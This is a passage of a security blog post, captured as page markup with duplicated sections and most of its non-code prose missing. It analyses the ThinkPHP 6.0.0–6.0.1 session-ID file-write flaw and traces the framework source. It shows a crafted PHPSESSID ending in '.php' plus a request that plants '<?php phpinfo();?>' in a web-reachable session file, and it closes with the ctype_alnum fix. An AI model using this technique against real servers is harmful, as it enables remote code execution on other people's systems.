</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name    = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handler = <span class=\"variable\">$handler</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$serialize</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;serialize = <span class=\"variable\">$serialize</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">setId</span>();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p> tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php<br>  PHPSESSID  session id</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$varSessionId</span> &amp;&amp; <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">request</span>(<span class=\"variable\">$varSessionId</span>)) &#123;</span><br><span class=\"line\">          <span class=\"variable\">$sessionId</span> = <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">request</span>(<span class=\"variable\">$varSessionId</span>);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"variable\">$sessionId</span> = <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">cookie</span>(<span class=\"variable\">$cookieName</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable\">$sessionId</span>) &#123;</span><br><span class=\"line\">          <span class=\"variable language_\">$this</span>-&gt;session-&gt;<span class=\"title function_ invoke__\">setId</span>(<span class=\"variable\">$sessionId</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">cookie</span>(<span class=\"variable\">$cookieName</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;PHPSESSID&#x27;</span>; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//PHPSESSID</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Store  setId(32 </p>\n<p>session tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php<br> write</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$sessionId</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\"><span class=\"comment\">// handler   think\\session\\driver\\file.php</span></span><br></pre></td></tr></table></figure>\n\n<p>write<br> tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$sessID</span>, <span class=\"keyword\">string</span> <span class=\"variable\">$sessData</span></span>): <span class=\"title\">bool</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getFileName</span>(<span class=\"variable\">$sessID</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"variable\">$data</span>     = <span class=\"variable\">$sessData</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//</span></span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"title function_ invoke__\">gzcompress</span>(<span class=\"variable\">$data</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">writeFile</span>(<span class=\"variable\">$filename</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">getFileName</span>(<span class=\"variable\">$sessID</span>, <span class=\"literal\">true</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFileName</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$name</span>, <span class=\"keyword\">bool</span> <span class=\"variable\">$auto</span> = <span class=\"literal\">false</span></span>): <span class=\"title\">string</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// </span></span><br><span class=\"line\">            <span class=\"variable\">$name</span> = <span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;prefix&#x27;</span>] . DIRECTORY_SEPARATOR . <span class=\"string\">&#x27;sess_&#x27;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;sess_&#x27;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$filename</span> = <span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;path&#x27;</span>] . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable\">$dir</span>      = <span class=\"title function_ invoke__\">dirname</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$auto</span> &amp;&amp; !<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$dir</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$dir</span>, <span class=\"number\">0755</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (\\<span class=\"built_in\">Exception</span> <span class=\"variable\">$e</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// </span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p> <code>$this-&gt;writeFile($filename, $data);</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">writeFile</span>(<span class=\"params\"><span class=\"variable\">$path</span>, <span class=\"variable\">$content</span></span>): <span class=\"title\">bool</span></span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> (<span class=\"keyword\">bool</span>) <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$path</span>, <span class=\"variable\">$content</span>, LOCK_EX);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>xxxxx.php</p>\n<h4 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h4><p><code>burpsuite</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /tp6/public/index.php?a=%3C?php%20phpinfo();?%3E HTTP/1.1</span><br><span class=\"line\">Host: tp6.com</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: PHPSESSID=e956ce73b3edb461e7e8b5f05d24bb53</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>PHPSESSID</p>\n<p>**<u>32</u>**</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHPSESSID=1234567890123456789012345678.php</span><br></pre></td></tr></table></figure>\n\n<p>.&#x2F;runtime&#x2F;session&#x2F;<br> <br> &#x2F;runtime&#x2F;session&#x2F;sess_1234567890123456789012345678.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151448676.png\"\n                        alt=\"-1667832045580\"\n                 ></p>\n<p></p>\n<h4 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h4><p>sessionid32<code>ctype_alnum</code></p>\n<blockquote>\n<h2 id=\"PHP-ctype-alnum--PHP-ctype-alnum-function\"><a href=\"#PHP-ctype-alnum--PHP-ctype-alnum-function\" class=\"headerlink\" title=\"PHP ctype_alnum() (PHP ctype_alnum() function)\"></a>PHP ctype_alnum() <strong>(<strong>PHP ctype_alnum() function</strong>)</strong></h2><p><strong>ctype_alnum() function</strong> is a character type (CType) function in PHP, it is used to check whether a given string <a class=\"link\"   href=\"https://so.csdn.net/so/search?q=contains&spm=1001.2101.3001.7020\" >contains<i class=\"fas fa-external-link-alt\"></i></a> alphanumeric characters or not.</p>\n<p><strong>ctype_alnum()</strong>PHP(CType) </p>\n<p>It returns true  if the string contains alphanumeric value (i.e. alphabets, digits&#x2F;number only), else it returns false.</p>\n<p>true -(&#x2F;)FALSE </p>\n</blockquote>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;id = <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$id</span>) &amp;&amp; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$id</span>) === <span class=\"number\">32</span> ctype_alnum<span class=\"variable\">$id</span> &amp;&amp; ? <span class=\"variable\">$id</span> : <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">microtime</span>(<span class=\"literal\">true</span>) . <span class=\"title function_ invoke__\">session_create_id</span>());</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"thinkphp6\"><a href=\"#thinkphp6\" class=\"headerlink\" title=\"thinkphp6\"></a>thinkphp6</h1><p>###tips</p>\n<p>thinkphp6.0.0~6.0.1</p>\n<h2 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\".\"></a>.</h2><p><code>phpstudy</code></p>\n<h4 id=\"1-phpstudy\"><a href=\"#1-phpstudy\" class=\"headerlink\" title=\"1.phpstudy\"></a>1.phpstudy</h4><p></p>\n<p><a class=\"link\"   href=\"https://www.xp.cn/download.html\" >https://www.xp.cn/download.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h4 id=\"2-composer\"><a href=\"#2-composer\" class=\"headerlink\" title=\"2.composer\"></a>2.composer</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446192.png\"\n                        alt=\"-1667831973498\"\n                 ></p>\n<p>composer1.8.5</p>\n<p>tp6</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer self-update//</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h4><h4 id=\"4-tp6\"><a href=\"#4-tp6\" class=\"headerlink\" title=\"4.tp6\"></a><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446455.png\"\n                        alt=\"-1667831982656\"\n                 >4.tp6</h4><p><code>composer</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer create-project topthink/think tp6    //tp6</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447839.png\"\n                        alt=\"-1667831995098\"\n                 ></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447681.png\"\n                        alt=\"-1667832028137\"\n                 ></p>\n<h2 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\".\"></a>.</h2><h4 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h4><p>sessionidxxx.phpsessionidsessiongetshell</p>\n<p> sessionid<br><code>tp6/vendor/topthink/framework/src/think/session/Store.php</code><br>121</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;id = <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$id</span>) &amp;&amp; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$id</span>) === <span class=\"number\">32</span> ? <span class=\"variable\">$id</span> : <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">microtime</span>(<span class=\"literal\">true</span>) . <span class=\"title function_ invoke__\">session_create_id</span>());</span><br></pre></td></tr></table></figure>\n\n<p>sessionid32</p>\n<p>session</p>\n<p><code>tp6/vendor/topthink/framework/src/think/session/Store.php</code></p>\n<p>254</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">save</span>(<span class=\"params\"></span>): <span class=\"title\">void</span></span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">       <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">clearFlashData</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"variable\">$sessionId</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getId</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable language_\">$this</span>-&gt;data)) &#123;</span><br><span class=\"line\">           <span class=\"variable\">$data</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$this</span>-&gt;data);</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$sessionId</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">delete</span>(<span class=\"variable\">$sessionId</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"variable language_\">$this</span>-&gt;init = <span class=\"literal\">false</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>session id  <code>$this-&gt;handler-&gt;write($sessionId, $data);;</code><br> handler<br>   SessionHandlerInterface $handler</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, SessionHandlerInterface <span class=\"variable\">$handler</span>, <span class=\"keyword\">array</span> <span class=\"variable\">$serialize</span> = <span class=\"literal\">null</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name    = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handler = <span class=\"variable\">$handler</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$serialize</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;serialize = <span class=\"variable\">$serialize</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">setId</span>();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p> tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php<br>  PHPSESSID  session id</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$varSessionId</span> &amp;&amp; <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">request</span>(<span class=\"variable\">$varSessionId</span>)) &#123;</span><br><span class=\"line\">          <span class=\"variable\">$sessionId</span> = <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">request</span>(<span class=\"variable\">$varSessionId</span>);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"variable\">$sessionId</span> = <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">cookie</span>(<span class=\"variable\">$cookieName</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable\">$sessionId</span>) &#123;</span><br><span class=\"line\">          <span class=\"variable language_\">$this</span>-&gt;session-&gt;<span class=\"title function_ invoke__\">setId</span>(<span class=\"variable\">$sessionId</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">cookie</span>(<span class=\"variable\">$cookieName</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;PHPSESSID&#x27;</span>; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//PHPSESSID</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Store  setId(32 </p>\n<p>session tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php<br> write</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$sessionId</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\"><span class=\"comment\">// handler   think\\session\\driver\\file.php</span></span><br></pre></td></tr></table></figure>\n\n<p>write<br> tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$sessID</span>, <span class=\"keyword\">string</span> <span class=\"variable\">$sessData</span></span>): <span class=\"title\">bool</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getFileName</span>(<span class=\"variable\">$sessID</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"variable\">$data</span>     = <span class=\"variable\">$sessData</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//</span></span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"title function_ invoke__\">gzcompress</span>(<span class=\"variable\">$data</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">writeFile</span>(<span class=\"variable\">$filename</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">getFileName</span>(<span class=\"variable\">$sessID</span>, <span class=\"literal\">true</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFileName</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$name</span>, <span class=\"keyword\">bool</span> <span class=\"variable\">$auto</span> = <span class=\"literal\">false</span></span>): <span class=\"title\">string</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> 